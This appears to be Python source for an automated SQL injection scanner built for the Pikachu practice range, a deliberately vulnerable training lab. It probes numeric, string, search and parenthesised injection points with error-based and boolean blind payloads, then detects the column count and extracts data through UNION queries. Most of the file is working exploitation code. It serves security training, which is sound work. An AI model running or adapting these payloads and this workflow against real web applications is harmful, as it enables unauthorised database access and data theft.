from core.sqli_scanner import SQLInjectionScanner

class PikachuSQLiScanner(SQLInjectionScanner):
    """Pikachu靶场专用SQL注入扫描器"""
    
    def __init__(self, base_url, output_callback=None, progress_callback=None, changes_callback=None, enable_file_output=False):
        """
        初始化Pikachu扫描器
        
        参数:
            base_url: Pikachu靶场基础URL
            output_callback: 输出回调函数
            progress_callback: 进度更新回调函数
            changes_callback: 页面变化回调函数，用于将页面变化信息传递给GUI
            enable_file_output: 是否启用文件输出功能
        """
        super().__init__(base_url, output_callback, progress_callback, changes_callback, enable_file_output)
    
    def test_numeric_injection(self):
        """测试数字型注入 (sqli_id.php)"""
        self.print("\n[*] 开始测试数字型注入...")
        url = f"{self.base_url}/vul/sqli/sqli_id.php"
        
        # 首先测试正常请求
        normal_response = self.send_request(url, method='POST', data={'id': '1', 'submit': '查询'})
        if not normal_response:
            return False, None, None, None
            
        # 测试基于错误的注入 - 尝试不同的闭合方式
        test_payloads = ["1'", '1"', "1')", '1\")', "1`"]
        
        for payload in test_payloads:
            response = self.send_request(url, method='POST', data={'id': payload, 'submit': '查询'})
            is_vul, db_type = self.is_vulnerable(response)
            if is_vul:
                self.print(f"[!] 数字型注入 - 发现基于错误的SQL注入漏洞！使用Payload: {payload}")
                return True, 'POST', 'id', {'submit': '查询'}
        
        # 测试基于布尔的盲注
        true_payloads = ["1 AND 1=1", "1 AND 1=1 # ", "1 AND 1=1 #"]
        false_payloads = ["1 AND 1=2", "1 AND 1=2 # ", "1 AND 1=2 #"]
        
        for i in range(len(true_payloads)):
            if self.check_boolean_based(url, true_payloads[i], false_payloads[i], 'POST', 'id', {'submit': '查询'}):
                self.print(f"[!] 数字型注入 - 发现基于布尔的SQL注入漏洞！")
                return True, 'POST', 'id', {'submit': '查询'}
            
        self.print("[-] 数字型注入 - 未发现明显的SQL注入漏洞")
        return False, None, None, None

    def test_string_injection(self):
        """测试字符型注入 (sqli_str.php)"""
        self.print("\n[*] 开始测试字符型注入...")
        url = f"{self.base_url}/vul/sqli/sqli_str.php"
        
        # 测试基于错误的注入
        error_payload = "vince'"
        response = self.send_request(url, params={'name': error_payload, 'submit': '查询'})
        is_vul, db_type = self.is_vulnerable(response)
        if is_vul:
            self.print(f"[!] 字符型注入 - 发现基于错误的SQL注入漏洞！数据库类型: {db_type}")
            return True, 'GET', 'name', None
            
        # 测试基于布尔的盲注
        true_payload = "vince' AND '1'='1"
        false_payload = "vince' AND '1'='2"
        if self.check_boolean_based(url, true_payload, false_payload, 'GET', 'name'):
            self.print("[!] 字符型注入 - 发现基于布尔的SQL注入漏洞！")
            return True, 'GET', 'name', None
            
        self.print("[-] 字符型注入 - 未发现明显的SQL注入漏洞")
        return False, None, None, None

    def test_search_injection(self):
        """测试搜索型注入 (sqli_search.php)"""
        self.print("\n[*] 开始测试搜索型注入...")
        url = f"{self.base_url}/vul/sqli/sqli_search.php"
        
        # 测试基于错误的注入
        error_payload = "a%'"
        response = self.send_request(url, params={'name': error_payload, 'submit': '搜索'})
        is_vul, db_type = self.is_vulnerable(response)
        if is_vul:
            self.print(f"[!] 搜索型注入 - 发现基于错误的SQL注入漏洞！数据库类型: {db_type}")
            return True, 'GET', 'name', None
            
        # 测试基于布尔的盲注
        true_payload = "a%' AND 1=1 AND '%'='"
        false_payload = "a%' AND 1=2 AND '%'='"
        if self.check_boolean_based(url, true_payload, false_payload, 'GET', 'name'):
            self.print("[!] 搜索型注入 - 发现基于布尔的SQL注入漏洞！")
            return True, 'GET', 'name', None
            
        self.print("[-] 搜索型注入 - 未发现明显的SQL注入漏洞")
        return False, None, None, None

    def test_xx_injection(self):
        """测试XX型注入 (sqli_x.php)"""
        self.print("\n[*] 开始测试XX型注入...")
        url = f"{self.base_url}/vul/sqli/sqli_x.php"
        
        # 测试不同的闭合方式
        test_payloads = ["1')", '1\")', "1`)", "1') # ", "1') #"]
        
        for payload in test_payloads:
            response = self.send_request(url, params={'name': payload, 'submit': '查询'})
            is_vul, db_type = self.is_vulnerable(response)
            if is_vul:
                self.print(f"[!] XX型注入 - 发现基于错误的SQL注入漏洞！使用Payload: {payload}")
                return True, 'GET', 'name', None
        
        # 测试基于布尔的盲注
        true_payloads = ["1') AND ('1'='1", "1') AND 1=1 # "]
        false_payloads = ["1') AND ('1'='2", "1') AND 1=2 # "]
        
        for i in range(len(true_payloads)):
            if self.check_boolean_based(url, true_payloads[i], false_payloads[i], 'GET', 'id'):
                self.print(f"[!] XX型注入 - 发现基于布尔的SQL注入漏洞！")
                return True, 'GET', 'id', None
            
        self.print("[-] XX型注入 - 未发现明显的SQL注入漏洞")
        return False, None, None, None

    def run_complete_scan(self):
        """运行完整的Pikachu SQL注入扫描"""
        self.print("=" * 30)
        self.print("Pikachu SQL注入自动化扫描器")
        self.print("=" * 30)
        
        # 初始化进度
        self.update_progress(0, "开始扫描")
        
        # 先测试连接
        if not self.test_connection():
            self.print("[!] 无法连接到靶场，请检查网络设置和靶场状态")
            self.update_progress(100, "扫描失败")
            return
        
        self.update_progress(10, "连接成功，开始测试注入类型")
        
        # 测试所有类型的注入
        injection_types = [
            ("数字型注入", self.test_numeric_injection),
            ("字符型注入", self.test_string_injection),
            ("搜索型注入", self.test_search_injection),
            ("XX型注入", self.test_xx_injection)
        ]
        
        vulnerabilities_found = 0
        total_steps = 4 * 3  # 4种注入类型，每种约3个步骤
        current_step = 1
        
        for i, (name, test_func) in enumerate(injection_types):
            self.print(f"\n{'='*30}")
            self.print(f"测试 {name}")
            self.print(f"{'='*30}")
            
            # 更新进度：测试特定类型的注入
            self.update_progress(min(100, 10 + i * 20), f"测试{name}")
            
            result, method, param, data_template = test_func()
            current_step += 1
            
            if result:
                vulnerabilities_found += 1
                # 更新进度：发现漏洞，准备提取信息
                self.update_progress(min(100, 10 + i * 20 + 5), f"{name}发现漏洞，提取信息")
                
                # 确定闭合模式
                if name == "数字型注入":
                    closing_pattern = "numeric"
                elif name == "字符型注入":
                    closing_pattern = "string"
                elif name == "搜索型注入":
                    closing_pattern = "search"
                elif name == "XX型注入":
                    closing_pattern = "xx"
                
                # 获取测试URL
                if name == "数字型注入":
                    url = f"{self.base_url}/vul/sqli/sqli_id.php"
                elif name == "字符型注入":
                    url = f"{self.base_url}/vul/sqli/sqli_str.php"
                elif name == "搜索型注入":
                    url = f"{self.base_url}/vul/sqli/sqli_search.php"
                elif name == "XX型注入":
                    url = f"{self.base_url}/vul/sqli/sqli_x.php"
                
                # 判断字段数（detect_column_count内部会更新进度）
                self.update_progress(min(100, 10 + i * 20 + 10), f"{name}检测字段数")
                column_count = self.detect_column_count(url, method, param, data_template, closing_pattern)
                current_step += 1
                
                if column_count:
                    # 更新进度：准备提取数据
                    self.update_progress(min(100, 10 + i * 20 + 15), f"{name}提取数据")
                    # 尝试使用UNION查询提取数据
                    self.extract_with_union(url, method, param, data_template, closing_pattern, column_count)
                    current_step += 1
        
        # 扫描完成，更新进度到100%
        self.update_progress(100, "扫描完成")
        self.print(f"\n[+] 扫描完成！共发现 {vulnerabilities_found} 个SQL注入漏洞")